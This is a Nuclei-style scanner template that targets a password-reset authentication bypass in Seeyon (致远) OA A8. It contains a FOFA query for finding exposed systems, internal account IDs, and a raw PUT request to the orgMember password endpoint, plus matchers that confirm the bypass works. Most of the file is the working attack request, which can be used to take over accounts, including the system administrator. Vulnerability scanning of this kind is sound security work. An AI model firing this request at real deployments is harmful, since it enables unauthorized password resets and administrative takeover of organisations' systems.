id: seeyon-oa-ucpclogin-password-reset

info:
  name: "致远 OA ucpcLogin 接口密码重置权限绕过"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="致远A8"
        致远A8 系统ucpcLogin接口存在权限校验逻辑缺陷，攻击者可通过构造特定请求绕过身份验证机制，实现对指定用户的密码重置操作，进而获取系统管理权限。
        漏洞影响审计管理员账户凭证控制
      seeyon-guest -696400025239268-----忽略
      system -72730320132347481---忽略
      audit-admin -440160666363------忽略
      group-admin 5725175934914479521
  tags: 致远OA

http:
- raw:
  - |
    PUT /seeyon/rest/orgMember/-7273032013234748168/password/share.do HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Connection: close
    Cookie: JSESSIONID=3891CB3E3CA435C599001E4F03A335B0; loginPageURL=
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'loginName'
